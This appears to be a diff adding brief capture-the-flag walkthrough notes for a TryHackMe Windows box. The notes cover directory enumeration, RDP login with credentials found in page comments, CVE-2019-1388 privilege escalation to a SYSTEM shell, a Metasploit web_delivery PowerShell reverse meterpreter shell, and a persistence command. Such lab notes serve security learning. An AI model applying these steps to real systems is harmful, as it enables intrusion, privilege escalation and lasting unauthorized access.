@@ -1,0 +1,38 @@
+IP : 10.10.136.25
+Open Ports : 80, 3389
+
+Lets enumeret 80:
+	Default IIS page
+Lets use gobuster:
+	Directory found : /retro
+Navigate to /retro:
+	Potential username : wade
+	Navigating through comments we found an potential password : parzival
+Lets try to login via MSRDP:
+	We can use remmina for that.
+	We are in.
+	We can read user.txt : THM{HACK_PLAYER_ONE}
+	
+	We found the cve user was searching : CVE-2019-1388
+	The user also left a file which we can use to gain internet explorer running as admin by going to show more details and viewing the certificate.
+	
+	We can use this to gain admin shells.
+		we can use ^S for getting a file browser and we can execute cmd from there it will ben and administrator shell.
+		just write cmd in file address bar and hit enter. we got an admin shell.
+
+	We can now navigate to admins desktop to get the flag.
+	
+	We got the flag : THM{COIN_OPERATED_EXPLOITATION}
+	Also we are running as nt authority\system.
+	
+
+	Now Lets use metasploit for getting a reverse shell back to our machine.
+	We can use exploit/multi/script/web_delivery
+	Set powershell as target
+	Set lhost and lport
+	set payload to windows/meterpreter/reverse_http
+	run the exploit in backgroud
+	copy the powershell exploit provided by metasploit and runit from the command prompt in target machine.
+	wait for some time, we will get a reverse meterpreter shell.
+	
+	run persistence -X -r IP -p port : for persistence.
